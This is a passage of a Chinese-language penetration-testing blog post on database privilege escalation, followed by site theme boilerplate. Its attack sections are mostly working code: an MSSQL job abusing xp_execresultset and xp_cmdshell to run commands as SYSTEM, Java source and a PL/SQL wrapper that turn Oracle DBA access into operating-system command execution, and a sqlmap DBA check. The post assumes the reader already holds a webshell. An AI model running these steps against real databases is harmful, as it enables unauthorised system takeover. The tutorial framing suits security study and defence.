class="hljs-string">&#x27;TSQL&#x27;</span>,<br><span class="hljs-variable">@command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;exec master..xp_execresultset N&#x27;&#x27;select &#x27;&#x27;&#x27;&#x27;exec master..xp_cmdshell &quot;要执行的命令&gt; c:\inetpub\wwwroot\results.txt&quot;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;,N&#x27;&#x27;Master&#x27;&#x27;&#x27;</span>  <br><span class="hljs-keyword">EXEC</span> sp_add_jobserver <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;GetSystemOnSQL&#x27;</span>,  #命令执行结果输出在 c:\inetpub\wwwroot\results.txt，路径可改<br><span class="hljs-variable">@server</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;目标主机名&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_start_job <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;GetSystemOnSQL&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>再执行命令<code>whoami</code>，发现系统权限已变为<code>authority/system</code>，说明提权成功。</p>
+<h1 id="Oracle数据库提权"><a href="#Oracle数据库提权" class="headerlink" title="Oracle数据库提权"></a>Oracle数据库提权</h1><ul>
+<li>利用Java包提权（数据库权限要求是最高的DBA权限）</li>
+<li>OracleShell工具提权</li>
+</ul>
+<h2 id="利用Java包提权"><a href="#利用Java包提权" class="headerlink" title="利用Java包提权"></a>利用Java包提权</h2><p>Oracle提权漏洞集中存在于PL&#x2F;SQL编写的函数、存储过程、包、触发器中。Oracle存在提权漏洞的一个重要原因是PL&#x2F;SQL定义的两种调用权限导致（定义者权限和调用者权限）。定义者权限给了低权限用户在特定时期拥有高权限的可能，这就给提权操作奠定了基础。</p>
+<p>即无论调用者权限如何，执行存储过程的结果权限永远为定义者的权限。因此，如果一个较高权限的用户定义了存储过程，并赋予了低权限用户调用权限，较低权限的用户即可利用这个存储过程提权。</p>
+<p>Java具有一组非常强大的标准库，Oracle数据库支持使用Java来编写存储过程，那么攻击者就可以通过这一特性，在系统上执行Java代码，从而完成提权操作。</p>
+<blockquote>
+<p><strong>Oracle执行Java代码的过程（以DBMS_EXPORT_EXTENSION()为例）</strong></p>
+<p>1、创建Java库</p>
+<p>2、赋予Java权限</p>
+<p>3、创建函数</p>
+<p>4、赋予函数执行权限</p>
+<p>5、执行</p>
+</blockquote>
+<p>首先，在拿到webshell的前提下，先遍历文件目录找到Oracle数据库登录信息，连接数据库后执行SQL语句<code>select * from session_roles</code>查看当前用户权限。如果是DBA权限则可进行以下操作：</p>
+<p>1.通过sys.dbms_export_extension()创建Java包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">create or replace and compile<br>java source named <span class="hljs-string">&quot;Util&quot;</span><br>as<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.*; <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Util</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Object</span><br>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">RunThis</span><span class="hljs-params">(String args)</span><br>&#123;<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-type">int</span> <span class="hljs-variable">rc</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>; <br><span class="hljs-keyword">try</span><br>&#123;<br><span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> rt.exec(args);<br><span class="hljs-type">int</span> <span class="hljs-variable">bufSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">4096</span>;<br><span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream(), bufSize);<br><span class="hljs-type">int</span> len;<br><span class="hljs-type">byte</span> buffer[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bufSize];<br><span class="hljs-comment">// Echo back what the program spit out</span><br><span class="hljs-keyword">while</span> ((len = bis.read(buffer, <span class="hljs-number">0</span>, bufSize)) != -<span class="hljs-number">1</span>)<br>System.out.write(buffer, <span class="hljs-number">0</span>, len); <br>rc = p.waitFor();<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception e)<br>&#123;<br>e.printStackTrace();<br>rc = -<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">finally</span><br>&#123;<br><span class="hljs-keyword">return</span> rc;<br>&#125;<br>&#125;<br>&#125;<br>/<br></code></pre></td></tr></table></figure>
+
+<p>2.创建自定义函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">create or replace<br>function <span class="hljs-title function_">RUN_CMD</span><span class="hljs-params">(p_cmd in varchar2)</span> <span class="hljs-keyword">return</span> number<br>as<br>language java<br>name <span class="hljs-string">&#x27;Util.RunThis(java.lang.String) return integer&#x27;</span>;<br>/<br>create or replace procedure <span class="hljs-title function_">RC</span><span class="hljs-params">(p_cmd in varchar2)</span><br>as<br>x number;<br>begin<br>x := run_cmd(p_cmd);<br>end;<br>/<br>variable x number;<br>set serveroutput on<br>exec dbms_java.set_output(<span class="hljs-number">100000</span>);<br>grant javasyspriv to CMS<br>/<br></code></pre></td></tr></table></figure>
+
+<p>3.连接Oracle数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">connect</span> CMS<span class="hljs-operator">/</span>NSFCMS@(description<span class="hljs-operator">=</span>(address_list<span class="hljs-operator">=</span>(address<span class="hljs-operator">=</span>(protocol<span class="hljs-operator">=</span>tcp)(host<span class="hljs-operator">=</span>主机地址)(port<span class="hljs-operator">=</span>端口)))(connect_data<span class="hljs-operator">=</span>(SERVICE_NAME<span class="hljs-operator">=</span>ORACLE)));<br></code></pre></td></tr></table></figure>
+
+<p>4.调用自定义函数执行命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> : x :<span class="hljs-operator">=</span> RUN_CMD(<span class="hljs-string">&#x27;要执行的命令&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>注意这里的命令不能通过webshell执行，而是要通过数据库管理工具（例如SQLplus）执行，所以建议在可以远程连接服务器时使用这种方法。</p>
+<h2 id="OracleShell工具提权"><a href="#OracleShell工具提权" class="headerlink" title="OracleShell工具提权"></a>OracleShell工具提权</h2><p>除此之外，我们也可以采用自动化工具OracleShell提权Oracle数据库，前提条件也是获取到dba的最高权限权限，并且需要知道SID，通常与账号密码在一起。<br>可以使用sqlmap检测是否为dbs权限，返回true则为dba权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap 数据库类型://用户名:密码@URL/数据库名 --is-dba<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/09/16/mIaPk8zxe56J1gn.png" srcset="/img/loading.gif" lazyload></p>
+<p>后面直接用工具连接即可。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">#权限提升</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>数据库提权</div>
+      <div>https://rookieterry.github.io/2021/10/27/数据库提权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>HackerTerry</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>星期三, 十月 27日 2021, 8:53 晚上</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/28/Kali%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89-Linux%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E5%92%8CU%E7%9B%98%E9%A9%AC%E5%88%B6%E4%BD%9C/" title="Kali渗透（二）--Linux主机上线和U盘马制作">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kali渗透（二）--Linux主机上线和U盘马制作</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/13/Web%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88/" title="Web漏洞综合">
+                        <span class="hidden-mobile">Web漏洞综合</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.7/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://twikoo.terrynet.live/","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+              Fluid.plugins.imageCaption(imgSelector);
+              Fluid.plugins.fancyBox(imgSelector);
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><br> <a href="https://ipw.cn/ipv6webcheck/?site=hackerterry.netlify.app" title="本站支持IPv6访问" target="_blank"><img style="display:inline-block;vertical-align:middle" alt="本站支持IPv6访问" src="https://static.ipw.cn/icon/ipv6-s5.svg" srcset="/img/loading.gif" lazyload></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
